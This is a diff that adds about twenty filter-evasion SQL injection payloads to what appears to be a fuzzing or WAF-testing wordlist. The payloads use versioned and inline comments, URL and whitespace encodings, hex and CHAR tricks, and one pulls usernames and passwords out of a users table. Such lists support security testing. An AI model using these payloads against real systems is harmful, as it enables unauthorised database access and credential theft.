@@ -15,3 +15,23 @@ sElEcT * FrOm users
 UNiOn SeLEcT NULL
 UNION%20SELECT
 UNION%09SELECT
+' /*!50000OR*/ '1'='1
+' /*!32302OR*/ 1=1--
+UN/**/ION SE/**/LECT 1,2,3
+1'%0d%0aOR%0d%0a'1'='1
+%2527 OR %25271%2527=%25271
+' OR 1e0=1e0--
+0'<1 OR '1'='1
+' OR 'a]a' LIKE 'a[*]a'--
+'%a0OR%a0'1'='1
+1' OR 0x31=0x31--
+' OR CHAR(49)=CHAR(49)--
+' OR 'ab'=N'ab'--
+'||1=1--
+' OR 1<2--
+' OR 2 BETWEEN 1 AND 3--
+UniOn%0bSeLeCt%0bNuLl
+UNION/*!*/SELECT
+' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3--
+1'+(s]elect+cOnCat(username,0x3a,password)+fRoM+users)+'
+'||(SeLEcT 1 FrOM DuAl WheRE 1=1)||'
